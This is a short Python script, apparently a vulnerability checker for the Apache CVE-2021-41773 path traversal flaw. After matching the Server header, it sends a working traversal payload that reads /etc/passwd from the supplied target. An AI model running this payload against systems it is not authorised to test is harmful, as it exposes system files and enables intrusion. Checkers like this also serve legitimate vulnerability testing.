import sys
import requests

print("=========================================")
print("CVE-2021-41773 Checker")
print("=========================================")

if len(sys.argv) != 2:
    print("Usage: python cve_check.py <url>")
    sys.exit(1)

target = sys.argv[1]

try:
    response = requests.get(target, timeout=5)

    server = response.headers.get("Server", "")
    print("[*] Server header:", server)

    if "Apache/2.4.49" not in server:
        print("[-] Target not vulnerable (version mismatch)")
        sys.exit(0)

    print("[+] Vulnerable Apache version detected")

    payload = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    probe_url = target + payload

    probe_response = requests.get(probe_url, timeout=5)

    if "root:x" in probe_response.text:
        print("[+] Vulnerable! Path traversal confirmed")
    else:
        print("[-] Probe sent but no sensitive file leaked")

except Exception as e:
    print("Error:", e)

print("\n=========================================")
print("Developed by sudo_0xksh")
print("=========================================")
